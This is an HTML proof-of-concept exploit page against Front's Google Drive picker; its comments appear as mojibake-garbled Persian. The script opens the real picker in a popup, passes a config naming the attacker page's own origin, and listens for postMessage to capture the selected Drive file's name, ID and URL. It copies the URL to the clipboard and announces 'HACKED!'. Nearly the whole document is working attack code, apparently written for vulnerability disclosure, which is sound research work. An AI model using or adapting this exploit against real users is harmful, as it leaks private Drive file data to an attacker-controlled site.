<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Front Picker PoC - Visual</title>
  <style>
    body { font-family: monospace; background: #1a1a2e; color: #0f0; padding: 20px; margin: 0; }
    h2 { color: #fff; border-bottom: 1px solid #444; padding-bottom: 10px; }
    .status { padding: 10px; background: #333; border-radius: 5px; margin: 10px 0; }
    .success { background: #1b5e20; color: #fff; }
    .error { background: #b71c1c; color: #fff; }
    #output { 
      background: #111; 
      padding: 15px; 
      border-radius: 5px; 
      white-space: pre-wrap; 
      word-break: break-all;
      border: 1px solid #444;
      max-height: 70vh;
      overflow-y: auto;
    }
    .label { color: #888; }
    .value { color: #0f0; }
    .highlight { color: #ffeb3b; font-weight: bold; }
  </style>
</head>
<body>
  <h2>ğŸ¯ Front Google Drive Picker PoC</h2>
  
  <div id="status" class="status">â³ Opening popup... Select a file to test.</div>
  
  <div id="output">
    <span class="label">Waiting for postMessage...</span>
  </div>

  <script>
    // === Û±. ØªÙ†Ø¸ÛŒÙ…Ø§Øª ===
    const PICKER_URL = "https://google-drive-picker.frontapplication.com/google-drive/index.html";
    const MY_ORIGIN = window.location.origin; // Ø®ÙˆØ¯Ú©Ø§Ø± Ø¯Ø§Ù…Ù†Ù‡â€ŒÛŒ ÙØ¹Ù„ÛŒ Ø±Ùˆ Ù…ÛŒâ€ŒÚ¯ÛŒØ±Ù‡ (Ø¨Ø¯ÙˆÙ† ÙØ§ØµÙ„Ù‡!)

    const config = {
      googleAppId: "754490832836",
      googleClientId: "754490832836-gs77odllghgisuja5jecijqihaolr08q.apps.googleusercontent.com",
      googleOAuthScope: "https://www.googleapis.com/auth/drive.readonly",
      googleDriveAllowedMimeTypes: "application/vnd.google-apps.document,application/vnd.google-apps.spreadsheet,application/vnd.google-apps.folder",
      origin: MY_ORIGIN // <<< Ø­ÛŒØ§ØªÛŒ: Ø¨Ø§ÛŒØ¯ Ø¯Ù‚ÛŒÙ‚Ø§Ù‹ Ø¨Ø±Ø§Ø¨Ø± Ø¨Ø§ origin ØµÙØ­Ù‡ Ø¨Ø§Ø´Ù‡
    };

    // === Û². ØªØ§Ø¨Ø¹ Ù†Ù…Ø§ÛŒØ´ Ø®Ø±ÙˆØ¬ÛŒ ØªÙˆÛŒ ØµÙØ­Ù‡ ===
    function showOutput(title, data, isSuccess = false) {
      const output = document.getElementById('output');
      const status = document.getElementById('status');
      
      let html = `<div class="label">${title}</div>\n`;
      
      if (isSuccess && data?.documents?.[0]) {
        const doc = data.documents[0];
        status.textContent = "ğŸ‰ SUCCESS! File metadata captured!";
        status.className = "status success";
        
        html += `\n<span class="highlight">ğŸ“„ File: ${doc.name || 'N/A'}</span>\n`;
        html += `<span class="label">â€¢ ID:</span> <span class="value">${doc.id || 'N/A'}</span>\n`;
        html += `<span class="label">â€¢ URL:</span> <span class="value">${doc.url || 'N/A'}</span>\n`;
        html += `<span class="label">â€¢ MimeType:</span> <span class="value">${doc.mimeType || 'N/A'}</span>\n`;
        html += `\n<span class="label">ğŸ”» Full JSON:</span>\n`;
        html += JSON.stringify(data, null, 2);
        
        // Ú©Ù¾ÛŒ Ø®ÙˆØ¯Ú©Ø§Ø± Ù„ÛŒÙ†Ú© ÙØ§ÛŒÙ„ Ø¨Ø±Ø§ÛŒ Ø±Ø§Ø­Øªâ€ŒØªØ± Ø´Ø¯Ù† Ú©Ø§Ø±
        if (doc.url) {
          navigator.clipboard?.writeText(doc.url);
          html += `\n\n<span class="highlight">ğŸ“‹ File URL copied to clipboard!</span>`;
        }
      } else {
        html += JSON.stringify(data, null, 2);
      }
      
      output.innerHTML = html;
      console.log("[PoC] Page updated:", data);
    }

    // === Û³. Ú¯ÙˆØ´ Ø¯Ø§Ø¯Ù† Ø¨Ù‡ postMessage ===
    window.addEventListener("message", (e) => {
      console.log("ğŸ“¨ [PoC] Message received!", { origin: e.origin,  e.data });
      
      // Ù†Ù…Ø§ÛŒØ´ Ø¯ÛŒØªØ§ ØªÙˆÛŒ ØµÙØ­Ù‡
      showOutput(`ğŸ“¨ Message from: ${e.origin}`, e.data, true);
      
      // Ø§Ú¯Ø± Ø¯ÛŒØªØ§ÛŒ Ù…ÙÛŒØ¯ Ø§ÙˆÙ…Ø¯ØŒ Ø¢Ù„Ø±Øª Ù‡Ù… Ø¨Ø¯Ù‡
      if(e.data?.type === "google-documents-selected" && e.data.documents?.length) {
        setTimeout(() => {
          alert("âœ… HACKED!\n\nFile: " + (e.data.documents[0].name || "Unknown") + 
                "\n\nCheck page for details.");
        }, 100);
      }
    }, false);

    // === Û´. Ø¨Ø§Ø² Ú©Ø±Ø¯Ù† Ù¾Ø§Ù¾â€ŒØ¢Ù¾ ===
    console.log("ğŸ¯ Opening picker popup...");
    console.log("ğŸ”— Config origin:", config.origin);
    
    const fullUrl = `${PICKER_URL}?config=${encodeURIComponent(JSON.stringify(config))}`;
    const popup = window.open(fullUrl, "picker", "width=700,height=600");

    // Ú†Ú© Ú©Ø±Ø¯Ù† ÙˆØ¶Ø¹ÛŒØª Ù¾Ø§Ù¾â€ŒØ¢Ù¾
    setTimeout(() => {
      const status = document.getElementById('status');
      if(!popup || popup.closed) {
        status.textContent = "âŒ Popup blocked or closed immediately!";
        status.className = "status error";
        showOutput("Error", { error: "Popup failed to open" });
      } else {
        // Ú†Ú© Ú©Ø±Ø¯Ù† Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ opener
        try {
          popup.eval?.("window.opener ? 'âœ… opener accessible' : 'âŒ opener is null'")
            .then?.(res => console.log("ğŸ” Popup says:", res))
            .catch?.(() => console.log("ğŸ” Cannot eval in popup"));
        } catch(e) {
          console.log("ğŸ” Cannot access popup context");
        }
      }
    }, 2000);
  </script>
</body>
</html>
